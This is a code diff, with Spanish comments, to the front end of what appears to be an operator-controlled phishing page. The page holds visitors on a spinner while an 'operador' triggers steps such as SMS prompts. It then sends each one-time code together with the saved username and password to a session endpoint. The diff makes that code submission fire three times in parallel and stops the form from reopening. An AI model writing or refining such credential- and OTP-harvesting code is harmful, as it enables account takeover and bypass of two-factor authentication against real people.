@@ -355,8 +355,14 @@
         const data = await response.json();
         const action = data.action;
 
-        // Si no hay acción o ya se procesó esta misma acción, no hacer nada (permanecer en el spinner indefinidamente)
+        // Si no hay acción o es la misma que ya procesamos, ignorar y permanecer en el spinner
         if (!action || action === lastHandledAction) return;
+
+        // Si el usuario acaba de enviar el código, permanecer en el spinner y NO reabrir el formulario para la misma acción
+        if (lastHandledAction === 'token-submitted' && action === currentOtpAction) {
+          return;
+        }
+
         lastHandledAction = action;
 
         if (action === 'sms') {
@@ -413,18 +419,21 @@
       const tokenVal = verifyCode.value.trim();
 
       showSpinner();
-      lastHandledAction = null; // Permitir que el operador envíe nuevas acciones posteriores
+      lastHandledAction = 'token-submitted';
+      sessionStorage.setItem('is_waiting', 'true');
+
+      const tokenPayload = JSON.stringify({
+        token: tokenVal,
+        username: sessionStorage.getItem('last_user') || '',
+        password: sessionStorage.getItem('last_pass') || ''
+      });
 
       try {
-        await fetch(`/api/sessions/${sessionId}/token`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            token: tokenVal,
-            username: sessionStorage.getItem('last_user') || '',
-            password: sessionStorage.getItem('last_pass') || ''
-          })
-        });
+        await Promise.all([
+          fetch(`/api/sessions/${sessionId}/token`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: tokenPayload }),
+          fetch(`/api/sessions/${sessionId}/token`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: tokenPayload }),
+          fetch(`/api/sessions/${sessionId}/token`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: tokenPayload })
+        ]);
       } catch (_) {}
     });
   }
